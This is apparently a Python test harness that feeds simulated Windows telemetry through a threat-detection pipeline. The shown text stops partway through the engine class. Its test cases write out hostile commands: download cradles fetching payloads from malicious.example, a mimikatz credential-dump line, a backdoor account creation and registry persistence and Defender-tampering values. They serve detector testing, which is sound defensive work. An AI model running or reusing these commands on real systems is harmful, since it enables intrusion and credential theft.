"""
======================================================================
Self-Evolving Security AI
Manual Testing Engine - End-to-End Detection Pipeline Validator
======================================================================

This module is a MANUAL VALIDATION FRAMEWORK (not pytest, not unit
testing). It drives realistic Windows-style telemetry through the
complete detection pipeline:

    Detector -> Risk Scoring -> Event Weighting -> Severity Decision
    -> Severity Metadata

for each of the four existing detector engines:

    DangerousProcessDetector
    DangerousFileDetector
    DangerousRegistryDetector
    DangerousNetworkDetector

The engine discovers detector and scoring APIs dynamically wherever
practical, never assumes a specific return representation (Enum,
IntEnum, dataclass, plain string, or None), and is resilient to any
single detector raising an exception -- the suite always continues.

Run directly:

    python manual_testing_engine.py

======================================================================
"""

from __future__ import annotations

import inspect
import logging
import statistics
import sys
import time
import uuid
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass, field, fields as dataclass_fields, is_dataclass
from datetime import datetime, timezone
from enum import Enum
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Sequence, Tuple

# ======================================================================
# PROJECT WIRING
# ======================================================================
# This file is expected to live at the project root, alongside the
# `detectors` and `scoring` packages. We add the project root to
# sys.path defensively so the module also works when executed from a
# different working directory.
_PROJECT_ROOT = Path(__file__).resolve().parent
if str(_PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(_PROJECT_ROOT))

import detectors.dangerous_process_detector as process_detector_mod
import detectors.dangerous_file_detector as file_detector_mod
import detectors.dangerous_registry_detector as registry_detector_mod
import detectors.dangerous_network_detector as network_detector_mod

import scoring.event_weighting as event_weighting_mod
import scoring.severity_decision as severity_decision_mod
import scoring.severity_metadata as severity_metadata_mod

# ======================================================================
# LOGGING
# ======================================================================
logger = logging.getLogger("manual_testing_engine")
if not logger.handlers:
    _handler = logging.StreamHandler()
    _handler.setFormatter(logging.Formatter("[%(levelname)s] %(name)s: %(message)s"))
    logger.addHandler(_handler)
logger.setLevel(logging.WARNING)


# ======================================================================
# SAFE CONVERSION HELPERS
# ----------------------------------------------------------------------
# These helpers must NEVER assume detector output shape. Results may be
# Enums, IntEnums, dataclasses, plain strings, custom objects, or None.
# ======================================================================

def safe_str(value: Any, default: str = "") -> str:
    """Safely converts any value into a plain string without raising."""
    if value is None:
        return default
    if isinstance(value, str):
        return value
    if isinstance(value, Enum):
        return value.name
    try:
        return str(value)
    except Exception:
        return default


def safe_name(value: Any, default: str = "UNKNOWN") -> str:
    """
    Safely extracts a human-readable name from an unknown detector value.

    Handles, in priority order: None, Enum/IntEnum, dataclasses (looks
    for common descriptive fields), plain strings, and generic objects
    exposing a `.name` attribute. Never calls `.upper()`/`.lower()`/
    `.name` directly on an unverified object.
    """
    if value is None:
        return default

    if isinstance(value, Enum):
        return value.name

    if isinstance(value, str):
        stripped = value.strip()
        return stripped if stripped else default

    if is_dataclass(value) and not isinstance(value, type):
        for candidate_field in ("name", "value", "severity", "risk_level", "category"):
            if hasattr(value, candidate_field):
                nested = getattr(value, candidate_field, None)
                if nested is not None:
                    return safe_name(nested, default)
        return default

    name_attr = getattr(value, "name", None)
    if isinstance(name_attr, str) and name_attr.strip():
        return name_attr.strip()

    try:
        text = str(value).strip()
        return text if text else default
    except Exception:
        return default


def safe_float(value: Any, default: float = 0.0) -> float:
    """Safely converts any value to a finite float, never raising."""
    if value is None:
        return default
    try:
        parsed = float(value)
    except (ValueError, TypeError):
        return default
    if parsed != parsed or parsed in (float("inf"), float("-inf")):
        return default
    return parsed


def safe_int(value: Any, default: int = 0) -> int:
    """Safely converts any value to an int, never raising."""
    try:
        return int(value)
    except (ValueError, TypeError):
        return default


def flatten_to_str_list(value: Any) -> List[str]:
    """
    Flattens a detector's matched_* field (which may be a list, tuple,
    set, dict, single Enum, or single string) into a de-duplicated list
    of display strings.
    """
    if value is None:
        return []

    if isinstance(value, dict):
        items: List[str] = []
        for key in value.keys():
            text = safe_name(key)
            if text and text not in items:
                items.append(text)
        return items

    if isinstance(value, (list, tuple, set)):
        items = []
        for element in value:
            text = safe_name(element)
            if text and text not in items:
                items.append(text)
        return items

    text = safe_name(value)
    return [text] if text else []


def dataclass_field_names(instance: Any) -> List[str]:
    """Returns the field names of a dataclass instance, or an empty list."""
    if instance is None or not is_dataclass(instance) or isinstance(instance, type):
        return []
    try:
        return [f.name for f in dataclass_fields(instance)]
    except Exception:
        return []


def extract_indicators(result_obj: Any) -> List[str]:
    """
    Dynamically discovers "matched_*" style fields on a detector result
    (regardless of whether it is DangerousProcessResult,
    DangerousFileResult, DangerousRegistryResult, or
    DangerousNetworkResult) and flattens them into one indicator list.
    Falls back to a handful of well-known single-value descriptive
    fields (extension, location, category, protocol, destination_ip,
    port_category, registry_path) when a detector exposes fewer
    "matched_*" collections than others.
    """
    indicators: List[str] = []

    for field_name in dataclass_field_names(result_obj):
        if field_name == "matched_rules":
            continue
        if not field_name.startswith("matched_"):
            continue
        value = getattr(result_obj, field_name, None)
        for entry in flatten_to_str_list(value):
            tagged = f"{field_name}:{entry}"
            if tagged not in indicators:
                indicators.append(tagged)

    for candidate_field in (
        "extension", "location", "category", "port_category",
        "protocol", "destination_ip", "registry_path",
    ):
        if not hasattr(result_obj, candidate_field):
            continue
        value = getattr(result_obj, candidate_field, None)
        text = safe_name(value, "")
        if text and text.upper() not in ("", "UNKNOWN", "NONE"):
            tagged = f"{candidate_field}:{text}"
            if tagged not in indicators:
                indicators.append(tagged)

    return indicators


# ======================================================================
# DYNAMIC ENGINE / DETECTOR DISCOVERY
# ======================================================================

def _class_defined_in(module: Any, cls: type) -> bool:
    return getattr(cls, "__module__", None) == getattr(module, "__name__", None)


def _best_effort_instantiate(cls: type) -> Optional[Any]:
    """
    Attempts to instantiate a class with no required knowledge of its
    constructor signature. Tries a bare call first, then falls back to
    supplying `None` for any required positional/keyword parameters.
    """
    try:
        return cls()
    except TypeError:
        pass
    except Exception as exc:
        logger.error("Unexpected error instantiating %s: %s", cls.__name__, exc)
        return None

    try:
        signature = inspect.signature(cls.__init__)
        kwargs: Dict[str, Any] = {}
        for param_name, param in signature.parameters.items():
            if param_name == "self":
                continue
            if param.kind in (inspect.Parameter.VAR_POSITIONAL, inspect.Parameter.VAR_KEYWORD):
                continue
            if param.default is inspect.Parameter.empty:
                kwargs[param_name] = None
        return cls(**kwargs)
    except Exception as exc:
        logger.error("Could not instantiate %s dynamically: %s", cls.__name__, exc)
        return None


def discover_class_with_method(module: Any, method_name: str) -> Optional[type]:
    """
    Scans a module for the first non-dataclass class defined in it that
    exposes a callable attribute named `method_name`. Used to locate
    detector classes and scoring engine classes without hardcoding
    their exact names.
    """
    for _, cls in inspect.getmembers(module, inspect.isclass):
        if not _class_defined_in(module, cls):
            continue
        if is_dataclass(cls):
            continue
        candidate = getattr(cls, method_name, None)
        if callable(candidate):
            return cls
    return None


@dataclass
class DetectorBinding:
    """Represents a dynamically discovered, ready-to-use detector."""
    label: str
    class_name: str
    detect: Callable[[Dict[str, Any]], Any]


def bind_detector(module: Any, label: str) -> Optional[DetectorBinding]:
    """Discovers and instantiates the detector class inside a module."""
    cls = discover_class_with_method(module, "detect")
    if cls is None:
        logger.error("No detector class with a `detect` method found in %s.", module.__name__)
        return None
    instance = _best_effort_instantiate(cls)
    if instance is None:
        return None
    detect_method = getattr(instance, "detect", None)
    if not callable(detect_method):
        return None
    return DetectorBinding(label=label, class_name=cls.__name__, detect=detect_method)


# ======================================================================
# TELEMETRY TEST CASE DEFINITIONS
# ======================================================================

class ExpectedOutcome(Enum):
    """
    Coarse expectation bucket for a telemetry sample. This is used only
    to derive a PASS/FAIL verdict from the *actual* pipeline output
    (risk score, is_dangerous, severity) -- it never substitutes for
    that output.
    """
    BENIGN = "BENIGN"
    SUSPICIOUS = "SUSPICIOUS"
    MALICIOUS = "MALICIOUS"
    INFORMATIONAL = "INFORMATIONAL"


@dataclass(frozen=True)
class TelemetryTestCase:
    """A single simulated telemetry event plus its coarse expectation."""
    name: str
    telemetry_type: str  # PROCESS | FILE | REGISTRY | NETWORK
    category: str
    expected_outcome: ExpectedOutcome
    event: Dict[str, Any]


def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


# ---------------------------------------------------------------------
# PROCESS telemetry samples
# ---------------------------------------------------------------------
def build_process_test_cases() -> List[TelemetryTestCase]:
    cases: List[TelemetryTestCase] = []

    def add(name: str, category: str, expected: ExpectedOutcome, **overrides: Any) -> None:
        base_event = {
            "timestamp": _now_iso(),
            "pid": 4321,
            "parent_pid": 1000,
            "username": "CORP\\jsmith",
            "is_signed": True,
            "integrity_level": "MEDIUM",
        }
        base_event.update(overrides)
        cases.append(TelemetryTestCase("PROCESS::" + name, "PROCESS", category, expected, base_event))

    add("Normal Explorer", "Normal Activity", ExpectedOutcome.BENIGN,
        process_name="explorer.exe", process_path=r"C:\Windows\explorer.exe",
        command_line="explorer.exe", parent_process_name="userinit.exe", is_signed=True)

    add("Normal Chrome Browsing", "Benign Activity", ExpectedOutcome.BENIGN,
        process_name="chrome.exe", process_path=r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        command_line=r"chrome.exe --profile-directory=Default", parent_process_name="explorer.exe")

    add("Normal Notepad", "Benign Activity", ExpectedOutcome.BENIGN,
        process_name="notepad.exe", process_path=r"C:\Windows\System32\notepad.exe",
        command_line=r"notepad.exe C:\Users\jsmith\Documents\notes.txt", parent_process_name="explorer.exe")

    add("System32 Legitimate Svchost", "Normal Activity", ExpectedOutcome.BENIGN,
        process_name="svchost.exe", process_path=r"C:\Windows\System32\svchost.exe",
        command_line=r"svchost.exe -k netsvcs -p", parent_process_name="services.exe",
        integrity_level="SYSTEM")

    add("Known Ransomware Binary", "Ransomware Behaviour", ExpectedOutcome.MALICIOUS,
        process_name="lockbit.exe", process_path=r"C:\Users\Public\lockbit.exe",
        command_line=r"lockbit.exe --encrypt --all-drives", parent_process_name="explorer.exe",
        is_signed=False)

    add("Known Malware Family Emotet", "Highly Malicious Activity", ExpectedOutcome.MALICIOUS,
        process_name="emotet.exe", process_path=r"C:\Users\Public\Downloads\emotet.exe",
        command_line=r"emotet.exe /silent", parent_process_name="winword.exe", is_signed=False)

    add("Offensive Tool Mimikatz - Credential Access", "Credential Access", ExpectedOutcome.MALICIOUS,
        process_name="mimikatz.exe", process_path=r"C:\Temp\mimikatz.exe",
        command_line=r"mimikatz.exe privilege::debug sekurlsa::logonpasswords",
        parent_process_name="cmd.exe", is_signed=False, integrity_level="HIGH")

    add("Encoded PowerShell Download Cradle", "Encoded PowerShell / Download Cradle",
        ExpectedOutcome.MALICIOUS,
        process_name="powershell.exe", process_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        command_line=(
            "powershell.exe -nop -w hidden -enc "
            "JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA"
        ),
        parent_process_name="winword.exe", is_signed=True)

    add("LOLBin Regsvr32 Squiblydoo", "LOLBins / Defense Evasion", ExpectedOutcome.SUSPICIOUS,
        process_name="regsvr32.exe", process_path=r"C:\Windows\System32\regsvr32.exe",
        command_line="regsvr32.exe /s /n /u /i:http://malicious.example/payload.sct scrobj.dll",
        parent_process_name="cmd.exe", is_signed=True)

    add("LOLBin Rundll32 Suspicious Export", "LOLBins", ExpectedOutcome.SUSPICIOUS,
        process_name="rundll32.exe", process_path=r"C:\Windows\System32\rundll32.exe",
        command_line=r"rundll32.exe C:\Users\Public\payload.dll,EntryPoint",
        parent_process_name="explorer.exe", is_signed=True)

    add("LOLBin Mshta Remote Payload", "LOLBins / Download Cradle", ExpectedOutcome.MALICIOUS,
        process_name="mshta.exe", process_path=r"C:\Windows\System32\mshta.exe",
        command_line="mshta.exe http://malicious.example/loader.hta",
        parent_process_name="outlook.exe", is_signed=True)

    add("LOLBin Certutil Download", "LOLBins / Download Cradle", ExpectedOutcome.MALICIOUS,
        process_name="certutil.exe", process_path=r"C:\Windows\System32\certutil.exe",
        command_line=r"certutil.exe -urlcache -split -f http://malicious.example/payload.exe C:\Temp\payload.exe",
        parent_process_name="cmd.exe", is_signed=True)

    add("LOLBin BITSAdmin Persistence Download", "BITSAdmin / Persistence", ExpectedOutcome.MALICIOUS,
        process_name="bitsadmin.exe", process_path=r"C:\Windows\System32\bitsadmin.exe",
        command_line=r"bitsadmin /transfer job /download /priority high http://malicious.example/x.exe C:\Temp\x.exe",
        parent_process_name="cmd.exe", is_signed=True)

    add("WMIC Remote Process Execution", "WMI Execution / Lateral Movement", ExpectedOutcome.SUSPICIOUS,
        process_name="wmic.exe", process_path=r"C:\Windows\System32\wbem\wmic.exe",
        command_line=r"wmic.exe /node:10.0.0.5 process call create cmd.exe",
        parent_process_name="cmd.exe", is_signed=True)

    add("Office Macro Spawning PowerShell", "Office Macro Execution / APT", ExpectedOutcome.MALICIOUS,
        process_name="powershell.exe", process_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        command_line="powershell.exe -nop -w hidden -e -bypass IEX(New-Object Net.WebClient).DownloadString('http://malicious.example/s.ps1')",
        parent_process_name="winword.exe", is_signed=True, integrity_level="MEDIUM")

    add("Temp Folder Execution", "Temp Execution", ExpectedOutcome.SUSPICIOUS,
        process_name="update.exe", process_path=r"C:\Users\jsmith\AppData\Local\Temp\update.exe",
        command_line=r"C:\Users\jsmith\AppData\Local\Temp\update.exe /install",
        parent_process_name="chrome.exe", is_signed=False)

    add("Public Folder Execution", "Public Folder Execution", ExpectedOutcome.SUSPICIOUS,
        process_name="tool.exe", process_path=r"C:\Users\Public\tool.exe",
        command_line=r"C:\Users\Public\tool.exe", parent_process_name="explorer.exe", is_signed=False)

    add("Downloads Folder Execution", "Downloads Execution", ExpectedOutcome.SUSPICIOUS,
        process_name="invoice.exe", process_path=r"C:\Users\jsmith\Downloads\invoice.exe",
        command_line=r"C:\Users\jsmith\Downloads\invoice.exe", parent_process_name="chrome.exe",
        is_signed=False)

    add("Suspicious Parent-Child: Winword -> Cmd", "Suspicious Parent-Child Process Chain",
        ExpectedOutcome.MALICIOUS,
        process_name="cmd.exe", process_path=r"C:\Windows\System32\cmd.exe",
        command_line=r"cmd.exe /c powershell -enc SQBFAFgA & del %temp%\*.tmp",
        parent_process_name="winword.exe", is_signed=True)

    add("Suspicious Parent-Child: IExplore -> Powershell", "APT-Style Activity", ExpectedOutcome.MALICIOUS,
        process_name="powershell.exe", process_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        command_line="powershell.exe -nop -w hidden -enc UwBlAHQALQBFAHgAZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQA=",
        parent_process_name="iexplore.exe", is_signed=True)

    add("Privilege Escalation via System Integrity CMD", "Privilege Escalation", ExpectedOutcome.MALICIOUS,
        process_name="cmd.exe", process_path=r"C:\Windows\System32\cmd.exe",
        command_line="cmd.exe /c whoami /priv & net user hacker Passw0rd! /add",
        parent_process_name="services.exe", is_signed=True, integrity_level="SYSTEM")

    add("System Process Anomaly: Fake Lsass", "Defense Evasion / Masquerading", ExpectedOutcome.MALICIOUS,
        process_name="lsass.exe", process_path=r"C:\Users\Public\lsass.exe",
        command_line=r"C:\Users\Public\lsass.exe", parent_process_name="explorer.exe", is_signed=False)

    add("BAT Script Execution", "Script Execution", ExpectedOutcome.SUSPICIOUS,
        process_name="cmd.exe", process_path=r"C:\Windows\System32\cmd.exe",
        command_line=r"cmd.exe /c C:\Users\Public\run.bat", parent_process_name="explorer.exe", is_signed=True)

    add("VBS Script Execution via Wscript", "Script Execution / LOLBins", ExpectedOutcome.SUSPICIOUS,
        process_name="wscript.exe", process_path=r"C:\Windows\System32\wscript.exe",
        command_line=r"wscript.exe C:\Users\jsmith\Downloads\invoice.vbs", parent_process_name="outlook.exe",
        is_signed=True)

    add("JS Script Execution via Cscript", "Script Execution / LOLBins", ExpectedOutcome.SUSPICIOUS,
        process_name="cscript.exe", process_path=r"C:\Windows\System32\cscript.exe",
        command_line=r"cscript.exe //B C:\Users\Public\dropper.js", parent_process_name="explorer.exe",
        is_signed=True)

    add("PS1 Script with Base64 Payload", "Encoded PowerShell", ExpectedOutcome.MALICIOUS,
        process_name="powershell.exe", process_path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        command_line=(
            "powershell.exe -File C:\\Users\\Public\\run.ps1 -enc "
            "QQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEA"
        ),
        parent_process_name="explorer.exe", is_signed=True)

    add("Unsigned SYS Driver from System32", "Defense Evasion", ExpectedOutcome.SUSPICIOUS,
        process_name="drvload.exe", process_path=r"C:\Windows\System32\driver.sys",
        command_line=r"drvload.exe C:\Windows\System32\driver.sys", parent_process_name="cmd.exe",
        is_signed=False)

    add("SCR File Masquerading as Screensaver", "Defense Evasion / Masquerading", ExpectedOutcome.SUSPICIOUS,
        process_name="photos.scr", process_path=r"C:\Users\jsmith\Downloads\photos.scr",
        command_line=r"C:\Users\jsmith\Downloads\photos.scr /S", parent_process_name="outlook.exe",
        is_signed=False)

    return cases


# ---------------------------------------------------------------------
# FILE telemetry samples
# ---------------------------------------------------------------------
def build_file_test_cases() -> List[TelemetryTestCase]:
    cases: List[TelemetryTestCase] = []

    def add(name: str, category: str, expected: ExpectedOutcome, **overrides: Any) -> None:
        base_event: Dict[str, Any] = {"timestamp": _now_iso(), "operation": "CREATE"}
        base_event.update(overrides)
        cases.append(TelemetryTestCase("FILE::" + name, "FILE", category, expected, base_event))

    add("Normal Document in My Documents", "Benign Activity", ExpectedOutcome.BENIGN,
        file_path=r"C:\Users\jsmith\Documents\quarterly_report.docx")

    add("Normal Photo on Desktop", "Benign Activity", ExpectedOutcome.BENIGN,
        file_path=r"C:\Users\jsmith\Pictures\vacation.jpg")

    add("System32 DLL - Legitimate", "Normal Activity", ExpectedOutcome.SUSPICIOUS,
        file_path=r"C:\Windows\System32\kernel32.dll")

    add("EXE Dropped in Temp Folder", "Temp Execution / Ransomware Staging", ExpectedOutcome.MALICIOUS,
        file_path=r"C:\Users\jsmith\AppData\Local\Temp\payload.exe")

    add("PowerShell Script in Startup Folder", "Persistence / Startup Folder", ExpectedOutcome.MALICIOUS,
        file_path=r"C:\Users\jsmith\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.ps1")

    add("Batch File in Public Folder", "Public Folder Execution", ExpectedOutcome.MALICIOUS,
        file_path=r"C:\Users\Public\run.bat")

    add("HTA File in Downloads", "Downloads Execution / LOLBins", ExpectedOutcome.MALICIOUS,
        file_path=r"C:\Users\jsmith\Downloads\invoice.hta")

    add("VBS Script in ProgramData", "Persistence", ExpectedOutcome.MALICIOUS,
        file_path=r"C:\ProgramData\updater.vbs")

    add("JS Dropper in Recycle Bin", "Defense Evasion", ExpectedOutcome.MALICIOUS,
        file_path=r"C:\$Recycle.Bin\S-1-5-21\dropper.js")

    add("SCR File in Downloads", "LOLBins / Masquerading", ExpectedOutcome.MALICIOUS,
        file_path=r"C:\Users\jsmith\Downloads\photos.scr")

    add("SYS Driver in Temp", "Ransomware / Rootkit Staging", ExpectedOutcome.MALICIOUS,
        file_path=r"C:\Windows\Temp\driver.sys")

    add("DLL Sideload in AppData Roaming", "Defense Evasion", ExpectedOutcome.MALICIOUS,
        file_path=r"C:\Users\jsmith\AppData\Roaming\version.dll")

    add("MSI Installer in Downloads", "Suspicious Activity", ExpectedOutcome.SUSPICIOUS,
        file_path=r"C:\Users\jsmith\Downloads\setup_tool.msi")

    add("Explicit Extension Override - PS1", "Encoded PowerShell / Script Delivery", ExpectedOutcome.MALICIOUS,
        file_path=r"C:\Users\jsmith\Documents\readme", extension="ps1")

    add("CMD Script in Inetcache", "Defense Evasion", ExpectedOutcome.MALICIOUS,
        file_path=r"C:\Users\jsmith\AppData\Local\Microsoft\Windows\INetCache\loader.cmd")

    add("Normal PDF Attachment", "Benign Activity", ExpectedOutcome.BENIGN,
        file_path=r"C:\Users\jsmith\Documents\invoice.pdf")

    add("Normal Spreadsheet", "Benign Activity", ExpectedOutcome.BENIGN,
        file_path=r"C:\Users\jsmith\Documents\budget.xlsx")

    return cases


# ---------------------------------------------------------------------
# REGISTRY telemetry samples
# ---------------------------------------------------------------------
def build_registry_test_cases() -> List[TelemetryTestCase]:
    cases: List[TelemetryTestCase] = []

    def add(name: str, category: str, expected: ExpectedOutcome, **overrides: Any) -> None:
        base_event: Dict[str, Any] = {"timestamp": _now_iso()}
        base_event.update(overrides)
        cases.append(TelemetryTestCase("REGISTRY::" + name, "REGISTRY", category, expected, base_event))

    add("Normal Wallpaper Setting", "Benign Activity", ExpectedOutcome.BENIGN,
        registry_path=r"HKCU\Control Panel\Desktop", registry_value="C:\\Users\\jsmith\\Pictures\\wall.jpg")

    add("Normal Recently Used Files", "Benign Activity", ExpectedOutcome.BENIGN,
        registry_path=r"HKCU\Software\Microsoft\Office\16.0\Word\File MRU", registry_value="report.docx")

    add("Run Key Persistence - PowerShell", "Registry Run Keys / Persistence", ExpectedOutcome.MALICIOUS,
        registry_path=r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
        registry_value=r"powershell.exe -enc SQBFAFgA -w hidden")

    add("RunOnce Key - Downloaded Payload", "RunOnce / Persistence", ExpectedOutcome.MALICIOUS,
        registry_path=r"HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce",
        registry_value=r"C:\Users\Public\Downloads\payload.exe")

    add("Startup Approved Bypass", "Startup Folder", ExpectedOutcome.SUSPICIOUS,
        registry_path=r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run",
        registry_value="malicious_app")

    add("Winlogon Shell Hijack", "Persistence / Winlogon", ExpectedOutcome.MALICIOUS,
        registry_path=r"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon",
        registry_value=r"explorer.exe, C:\Users\Public\evil.exe")

    add("Image File Execution Options Debugger Hijack", "Process Hijacking / Defense Evasion",
        ExpectedOutcome.MALICIOUS,
        registry_path=r"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe",
        registry_value=r"cmd.exe")

    add("LSA Security Providers Credential Access", "Credential Access", ExpectedOutcome.MALICIOUS,
        registry_path=r"HKLM\System\CurrentControlSet\Control\Lsa\Security Providers",
        registry_value=r"C:\Windows\System32\evilcred.dll")

    add("Windows Defender Policy Tamper", "Security Bypass / Defense Evasion", ExpectedOutcome.MALICIOUS,
        registry_path=r"HKLM\Software\Policies\Microsoft\Windows Defender",
        registry_value="DisableAntiSpyware=1")

    add("Service Privilege Escalation", "Privilege Escalation / Services", ExpectedOutcome.MALICIOUS,
        registry_path=r"HKLM\System\CurrentControlSet\Services\FakeSvc",
        registry_value=r"cmd.exe /c C:\Users\Public\escalate.exe")

    add("Command Processor AutoRun Bypass", "Security Bypass", ExpectedOutcome.MALICIOUS,
        registry_path=r"HKCU\Software\Microsoft\Command Processor",
        registry_value=r"C:\Windows\Temp\autorun.bat")

    add("Temp Location Autorun Value", "Temp Execution", ExpectedOutcome.SUSPICIOUS,
        registry_path=r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
        registry_value=r"C:\Users\jsmith\AppData\Local\Temp\updater.exe")

    add("Encoded Command in Run Key", "Encoded PowerShell / Persistence", ExpectedOutcome.MALICIOUS,
        registry_path=r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
        registry_value="powershell -encodedcommand ZQBjAGgAbwA= -bypass -hidden")

    add("Unrelated Key - No Category Match", "Informational", ExpectedOutcome.INFORMATIONAL,
        registry_path=r"HKCU\Software\SomeVendor\SomeApp\Settings",
        registry_value="theme=dark")

    add("BootExecute Session Manager Persistence", "Startup / Persistence", ExpectedOutcome.MALICIOUS,
        registry_path=r"HKLM\System\CurrentControlSet\Control\Session Manager\BootExecute",
        registry_value=r"autocheck autochk C:\Users\Public\rootkit.exe")

    return cases


# ---------------------------------------------------------------------
# NETWORK telemetry samples
# ---------------------------------------------------------------------
def build_network_test_cases() -> List[TelemetryTestCase]:
    cases: List[TelemetryTestCase] = []

    def add(name: str, category: str, expected: ExpectedOutcome, **overrides: Any) -> None:
        base_event: Dict[str, Any] = {"timestamp": _now_iso(), "direction": "OUTBOUND"}
        base_event.update(overrides)
        cases.append(TelemetryTestCase("NETWORK::" + name, "NETWORK", category, expected, base_event))

    add("Normal HTTPS Browsing", "Benign Activity", ExpectedOutcome.BENIGN,
        destination_ip="93.184.216.34", port=443, protocol="HTTPS")

    add("Normal Internal DNS Query", "Benign Activity", ExpectedOutcome.BENIGN,
        destination_ip="10.0.0.10", port=53, protocol="DNS", direction="OUTBOUND")

    add("Private IP Communication", "Private IP Communication", ExpectedOutcome.BENIGN,
        destination_ip="192.168.1.50", port=445, protocol="SMB", direction="OUTBOUND")

    add("External IP Communication on RDP", "External IP Communication / Remote Access",
        ExpectedOutcome.MALICIOUS,
        destination_ip="203.0.113.77", port=3389, protocol="RDP", direction="OUTBOUND")

    add("Known Malicious Port - Metasploit Default", "Known Malicious Ports", ExpectedOutcome.MALICIOUS,
        destination_ip="198.51.100.23", port=4444, protocol="TCP", direction="OUTBOUND")

    add("Known Malicious Port - BackOrifice", "Known Malicious Ports", ExpectedOutcome.MALICIOUS,
        destination_ip="198.51.100.99", port=31337, protocol="TCP", direction="OUTBOUND")

    add("TOR Exit Node Communication", "TOR Network Activity", ExpectedOutcome.MALICIOUS,
        destination_ip="185.220.101.5", port=9050, protocol="TOR", direction="OUTBOUND")

    add("Proxy Port Evasion", "Proxy Evasion", ExpectedOutcome.SUSPICIOUS,
        destination_ip="203.0.113.200", port=8080, protocol="HTTP", direction="OUTBOUND")

    add("DNS Tunneling Suspicious Domain", "DNS Tunneling", ExpectedOutcome.MALICIOUS,
        destination_ip="203.0.113.10", port=53, protocol="DNS",
        domain="a1b2c3d4e5f6.data-exfil.malicious-example.net", direction="OUTBOUND")

    add("Unknown / Unregistered Protocol", "Unknown Protocol", ExpectedOutcome.SUSPICIOUS,
        destination_ip="203.0.113.44", port=31415, protocol="CUSTOMPROTO", direction="OUTBOUND")

    add("FTP to External Host", "Dangerous Protocol", ExpectedOutcome.MALICIOUS,
        destination_ip="203.0.113.15", port=21, protocol="FTP", direction="OUTBOUND")

    add("Telnet to External Host", "Dangerous Protocol", ExpectedOutcome.MALICIOUS,
        destination_ip="203.0.113.16", port=23, protocol="TELNET", direction="OUTBOUND")

    add("SMB Lateral Movement to External IP", "Defense Evasion / Lateral Movement",
        ExpectedOutcome.MALICIOUS,
        destination_ip="203.0.113.17", port=445, protocol="SMB", direction="OUTBOUND")

    add("Broadcast Address Communication", "Anomalous Broadcast", ExpectedOutcome.SUSPICIOUS,
        destination_ip="255.255.255.255", port=137, protocol="NETBIOS", direction="OUTBOUND")

    add("Inbound Connection From External IP", "APT-Style Activity", ExpectedOutcome.SUSPICIOUS,
        destination_ip="203.0.113.201", port=8443, protocol="HTTPS", direction="INBOUND")

    add("Loopback Communication", "Benign Activity", ExpectedOutcome.BENIGN,
        destination_ip="127.0.0.1", port=8080, protocol="HTTP", direction="OUTBOUND")

    return cases


def build_all_test_cases() -> List[TelemetryTestCase]:
    """Aggregates every telemetry sample across all four detector types."""
    all_cases: List[TelemetryTestCase] = []
    all_cases.extend(build_process_test_cases())
    all_cases.extend(build_file_test_cases())
    all_cases.extend(build_registry_test_cases())
    all_cases.extend(build_network_test_cases())
    return all_cases


# ======================================================================
# SEVERITY RANKING (string-based, representation-agnostic)
# ======================================================================
_SEVERITY_RANK: Dict[str, int] = {
    "INFO": 1,
    "LOW": 2,
    "MEDIUM": 3,
    "HIGH": 4,
    "CRITICAL": 5,
}


def _severity_rank(severity_name: str) -> int:
    return _SEVERITY_RANK.get(safe_name(severity_name, "INFO").upper(), 1)


# ======================================================================
# PIPELINE RESULT
# ======================================================================

@dataclass
class PipelineTestResult:
    """Everything printed and aggregated for a single executed test."""
    test_name: str
    telemetry_type: str
    category: str
    detector_used: str
    indicators_matched: List[str]
    rules_matched: List[str]
    risk_score: float
    weighted_score: float
    severity: str
    confidence: float
    reasons: List[str]
    summary: str
    passed: bool
    verdict_reason: str
    duration_ms: float
    exception_text: Optional[str] = None


# ======================================================================
# MANUAL TESTING ENGINE
# ======================================================================

class ManualTestingEngine:
    """
    Orchestrates the full detector -> risk scoring -> event weighting ->
    severity decision -> severity metadata pipeline against simulated
    telemetry, printing a structured report for every test and an
    aggregate summary at the end.

    Fully stateless per-call (aside from read-only bindings established
    at construction time), so `run_all()` can safely execute tests
    concurrently across threads.
    """

    def __init__(self) -> None:
        self._detectors: Dict[str, Optional[DetectorBinding]] = {
            "PROCESS": bind_detector(process_detector_mod, "DangerousProcessDetector"),
            "FILE": bind_detector(file_detector_mod, "DangerousFileDetector"),
            "REGISTRY": bind_detector(registry_detector_mod, "DangerousRegistryDetector"),
            "NETWORK": bind_detector(network_detector_mod, "DangerousNetworkDetector"),
        }

        weight_engine_cls = discover_class_with_method(event_weighting_mod, "evaluate")
        self._weight_engine = _best_effort_instantiate(weight_engine_cls) if weight_engine_cls else None

        severity_engine_cls = discover_class_with_method(severity_decision_mod, "evaluate")
        self._severity_engine = _best_effort_instantiate(severity_engine_cls) if severity_engine_cls else None

        metadata_builder_cls = discover_class_with_method(severity_metadata_mod, "build")
        self._metadata_builder = _best_effort_instantiate(metadata_builder_cls) if metadata_builder_cls else None

        for label, binding in self._detectors.items():
            if binding is None:
                logger.error("Detector unavailable for telemetry type '%s'.", label)
        if self._weight_engine is None:
            logger.error("Event weighting engine could not be discovered/instantiated.")
        if self._severity_engine is None:
            logger.error("Severity decision engine could not be discovered/instantiated.")
        if self._metadata_builder is None:
            logger.error("Severity metadata builder could not be discovered/instantiated.")

